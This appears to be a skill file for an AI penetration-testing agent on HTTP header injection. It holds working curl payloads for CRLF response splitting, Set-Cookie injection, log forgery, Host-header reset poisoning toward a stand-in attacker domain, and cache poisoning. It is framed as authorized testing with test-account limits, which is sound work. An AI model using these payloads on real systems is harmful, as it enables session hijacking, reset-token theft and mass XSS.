---
name: header_injection
agent: agent5_injection
description: HTTP header injection — CRLF/response splitting, log injection, Host header attacks, and cache poisoning via unkeyed headers.
---

# Header Injection

## Purpose

Tests attacker-controlled HTTP headers as an injection surface: CRLF/response splitting, log injection, Host header poisoning (password-reset poisoning, cache poisoning), and web-cache poisoning via unkeyed headers. Headers are trusted implicitly by backends — they flow into logs, emails, redirects, and cache keys without the validation that body parameters get. Real impact: session fixation via injected Set-Cookie, password-reset token theft via Host poisoning, stored XSS via log-viewer injection, and cache poisoning affecting all users.

## Division of labor

- **Consumes:** endpoint inventory from `agent2_mapping`, cache-behavior notes from `agent4_cache` (if cache exists), password-reset and email flows from `agent3_auth`.
- **Produces:** `findings/header_injection.md` — per-vector verdict table (CRLF / log injection / Host attacks / cache poisoning) with raw pairs. Finished artifact.

## When to use / when NOT to use

- **Use when:** the app reflects headers (User-Agent, Referer, X-Forwarded-For) anywhere; password-reset emails contain links; the app sits behind a CDN/cache; logs are viewable (admin panels, error pages echoing IPs).
- **Skip when (time-pass filter):** the app is behind a WAF that strips CRLF at the edge AND the backend is verified to never see raw headers (test once with a canary — if the canary never appears anywhere, stop); no cache layer exists (skip the cache-poisoning section, do the rest); password reset uses app-generated tokens with no host-derived URLs (verify by reading one reset email — don't assume).

## Methodology — CRLF / response splitting

1. **Baseline header reflection.** Send a canary in `User-Agent: CANARY9q`, `Referer`, `X-Forwarded-For` and check every response surface: body, headers, error pages, logs if visible. Record where each header lands.
2. **CRLF probe.** `X-Forwarded-For: 1.1.1.1%0d%0aX-Injected: canary9q` — then check the RESPONSE headers for `X-Injected`. If present, response splitting is live. Also try `%0a` alone and raw `\r\n` (some stacks decode once, some twice — try single and double encoding).
3. **Set-Cookie injection (the high-impact CRLF).** `...%0d%0aSet-Cookie: session=hijacked9q` — if the response carries your Set-Cookie, you have session fixation/response splitting CONFIRMED. Do not fixate a real victim session — the injected header in YOUR response is the proof.
4. **Reflected XSS via header.** If a header reflects into HTML body without encoding, test the `xss_hunter` context-mapping skill on it — header XSS is still XSS.

## Methodology — log injection

5. **Log landing check.** Put `CANARY9q` in User-Agent and X-Forwarded-For, then find where logs surface (admin "recent logins", error pages showing IP, audit views). No visible log = note and move on; don't burn the run.
6. **Log forgery.** `X-Forwarded-For: 1.1.1.1\n[ADMIN] password changed for root` — if the log viewer renders newlines, you can forge entries. Newline, `%0a`, and `%0d%0a` variants.
7. **Log-viewer XSS.** `User-Agent: <script>`-family payloads per the `xss_hunter` skill — if the admin log viewer renders HTML unsanitized, this is stored XSS against admins. Test with a benign canary tag first (`<b>LOGXSS9q</b>`), escalate only on reflection.

## Methodology — Host header attacks

8. **Baseline absolute-URL generation.** Trigger a password reset and read the email (via the test inbox). Record the reset-link host. This is the value you will try to poison.
9. **Host override.** Send `Host: evil9q.<YOUR_DOMAIN>` on the reset request. Then try `X-Forwarded-Host: evil9q.<YOUR_DOMAIN>` with the real Host. If the reset email link uses your host → password-reset poisoning CONFIRMED (token goes to your domain). Do NOT trigger resets for real users — use your own test account.
10. **Cache-key Host differential.** Request the homepage with `Host: evil9q.<YOUR_DOMAIN>` vs the real host. If the poisoned response gets cached and served to a clean request (check with a second clean client), you have Host-based cache poisoning.
11. **Routing differential.** Some stacks route by Host — a poisoned Host reaching a different vhost (default site, debug panel) is its own finding. Record status/body diffs.

## Methodology — cache poisoning via headers

12. **Identify unkeyed headers.** From `agent4_cache` notes (or test directly): find headers that change the response but are NOT part of the cache key. Test: `X-Forwarded-Scheme`, `X-Forwarded-Proto`, `X-Original-URL`, `X-Rewrite-URL`, `Forwarded`, `Accept`, `User-Agent` (on some stacks).
13. **The poison test.** Send the header with a canary value + a cache-buster query param, then request the same URL WITHOUT the header and WITHOUT the buster. If the canary appears in the second response → the poisoned response was cached → CONFIRMED cache poisoning. 2x with fresh canaries.
14. **Impact triage.** Classify what the poisoned content does: reflected XSS in cached page (critical), redirect to attacker host (high), cosmetic defacement (medium). The cache-poisoned XSS that hits every visitor is the war-story-grade outcome — document the exact header and payload.
15. **Verdict per vector.** Each of the four sections gets CONFIRMED/INCONCLUSIVE/NEGATIVE with raw pairs. A NEGATIVE on Host attacks after steps 8–11 is final for this run.

## Exact commands

Header reflection baseline:
```bash
curl -s -D - -o body.html '<TARGET>/' -A 'CANARY9q' -H 'X-Forwarded-For: 9.9.9.9' -e 'https://ref9q.example/'
grep -a -o -m3 'CANARY9q\|9\.9\.9\.9\|ref9q' body.html; echo '--- response headers: ---'; grep -ai 'canary\|9\.9\.9' <(curl -s -D - -o /dev/null '<TARGET>/' -A 'CANARY9q')
```

CRLF probe (single + double encoded):
```bash
curl -s -D - -o /dev/null '<TARGET>/' -H 'X-Forwarded-For: 1.1.1.1%0d%0aX-Injected: canary9q' | grep -ai 'x-injected' || echo 'no split (single)'
curl -s -D - -o /dev/null '<TARGET>/' -H 'X-Forwarded-For: 1.1.1.1%250d%250aX-Injected: canary9q' | grep -ai 'x-injected' || echo 'no split (double)'
```

Set-Cookie injection proof:
```bash
curl -s -D - '<TARGET>/' -o /dev/null -H 'X-Forwarded-For: 1.1.1.1%0d%0aSet-Cookie: hijack9q=1' | grep -ai 'hijack9q' || echo 'no cookie injection'
```

Log forgery probe:
```bash
curl -s -o /dev/null '<TARGET>/login' -H 'X-Forwarded-For: 1.1.1.1%0a[ADMIN] password changed for root%0a' -d 'u=x&p=y'
echo 'now inspect the visible log surface for the forged line'
```

Host header poisoning (own test account only):
```bash
curl -s -X POST '<TARGET>/api/password-reset' -H 'Content-Type: application/json' -H 'Host: evil9q.<YOUR_DOMAIN>' -d '{"email":"<YOUR_TEST_EMAIL>"}' -o /dev/null -w 'reset sent: %{http_code}\n'
curl -s -X POST '<TARGET>/api/password-reset' -H 'Content-Type: application/json' -H 'X-Forwarded-Host: evil9q.<YOUR_DOMAIN>' -d '{"email":"<YOUR_TEST_EMAIL>"}' -o /dev/null -w 'reset via XFH: %{http_code}\n'
echo 'read the reset email; check whether the link host is evil9q.<YOUR_DOMAIN>'
```

Cache poisoning via unkeyed header:
```bash
curl -s '<TARGET>/page?buster=poison1' -H 'X-Forwarded-Scheme: https' -H 'X-Forwarded-Host: evil9q.<YOUR_DOMAIN>' -o p1.html
grep -a -o -m1 'evil9q' p1.html && echo 'header reflected'
curl -s '<TARGET>/page' -o p2.html
grep -a -o -m1 'evil9q' p2.html && echo 'POISON CACHED' || echo 'not cached'
```

## Unkeyed-header catalog and encoding matrix

**Headers to test for cache-key exclusion (one at a time, with cache-buster):**
- `X-Forwarded-Host` / `X-Host` — classic cache-poisoning via host reflection
- `X-Forwarded-Scheme` / `X-Forwarded-Proto` (`http` vs `https`) — scheme-downgrade poisoning
- `X-Original-URL` / `X-Rewrite-URL` — some stacks rewrite the path from these; a poisoned rewrite cached = stored open redirect for all visitors
- `Forwarded: for=...;host=...` — RFC 7239; parsed by Java stacks that ignore X-Forwarded-*
- `Accept` / `Accept-Language` — occasionally unkeyed; poison via content-negotiation reflection
- `User-Agent` — rarely unkeyed, but when reflected into a cached page it's stored XSS for everyone
- `Cookie` — NEVER part of the key on most CDNs, but some misconfigured caches key on it — test with a canary cookie + buster

**CRLF encoding matrix (try each where the single-encoded probe failed):**
1. `%0d%0a` (standard)
2. `%0a` (LF only — works on stacks that normalize CRLF→LF before the header check)
3. `%250d%250a` (double-encoded — works when the backend decodes twice)
4. `%0d` / `%0a` mixed with `%20` padding
5. Unicode: `%u000d%u000a` (IIS-era), `&#13;&#10;` (only where HTML-decoding precedes header write — rare, log the attempt)

**Host-attack variants beyond the basics:**
- `Host: real.com` + `X-Forwarded-Host: evil` — backend prefers XFH (very common in Spring/Express behind proxies)
- Absolute-URI request line: `GET http://evil9q.<YOUR_DOMAIN>/reset HTTP/1.1` with normal Host — some stacks take the URI host
- Duplicate Host headers: `Host: real.com` + `Host: evil` — ambiguous parsing; record which one wins in the reset email

## Completion-bias defenses

- [ ] Canary reflection checked for UA, Referer, XFF on every major page
- [ ] CRLF tried single-encoded, double-encoded, and LF-only
- [ ] Set-Cookie injection attempted wherever CRLF landed
- [ ] Log surface located before log-injection claims (no visible log = no claim)
- [ ] Password-reset email actually read for the Host-poisoning test (own account)
- [ ] X-Forwarded-Host tried separately from Host
- [ ] Unkeyed-header list tested against the cache with the two-request poison proof
- [ ] Cache-poison claims reproduced 2x with fresh canaries and fresh busters
- [ ] Impact of each poison classified (XSS/redirect/cosmetic)
- [ ] `findings/header_injection.md` exists with all four sections
- **Review step:** agent10_review must verify (a) CRLF claims show the injected header in the saved response headers, (b) Host-poisoning claims include the actual reset-email link, (c) cache-poison claims show the clean second request serving the canary, (d) no reset was triggered for any non-test account.
- **Nudge prompts:**
  - "Keep going until single, double, and LF-only encodings are tried — the parser that blocks one often allows another."
  - "A reflected header is not cache poisoning. The clean second request serving your canary is the proof."
  - "Do not report done before findings/header_injection.md exists on disk."
- **Finished artifact definition:** `findings/header_injection.md` — four sections (CRLF, log injection, Host attacks, cache poisoning), per-vector verdict table + raw pairs + reset-email evidence where applicable.

## Evidence standard

- Baseline: canary-reflection map saved before injection; clean cache state verified before poison tests.
- Reproduction: CRLF 2x; Host poisoning 2x (two reset emails); cache poison 2x with fresh canaries.
- Raw evidence: full request/response header dumps (`curl -D -`); reset email body; p1/p2 poison pair.
- Verdicts: CONFIRMED (meets the section's proof bar) / INCONCLUSIVE (reflection without injection, needs second run) / NEGATIVE (canary never lands anywhere after the full ladder).

## Handoffs

- `xss_hunter` skill: consumes header-reflection points — context-maps any reflected header for XSS.
- `agent9_chaining`: consumes CONFIRMED Host-poisoning and cache-poisoning — reset-token theft chains and mass-impact escalation (human-approved).
- `agent4_cache`: receives the unkeyed-header list to refine the cache model.
- `agent10_review`: consumes `findings/header_injection.md` — verifies proof bars before shipping.
